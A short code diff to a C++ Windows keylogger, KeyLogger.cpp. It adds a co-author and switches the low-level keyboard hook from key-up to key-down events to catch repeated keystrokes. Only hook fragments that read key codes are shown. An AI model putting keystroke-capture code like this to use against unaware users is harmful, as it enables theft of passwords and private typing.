@@ -1,6 +1,6 @@
 /**
   * @file KeyLogger.cpp
-  * @author Daniel Amodio
+  * @author Daniel Amodio, Greg Siegel
   * @date May 1, 2009
   */
   
@@ -56,7 +56,7 @@ LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPAR
 
     switch (wParam)
     {
-    case WM_KEYUP: // When the key has been pressed and released
+    case WM_KEYDOWN: // When the key has been pressed. Changed from WM_KEYUP to catch multiple strokes.
     {
         // Assign keyboard code to local variable
         DWORD vkCode = pKeyBoard->vkCode;
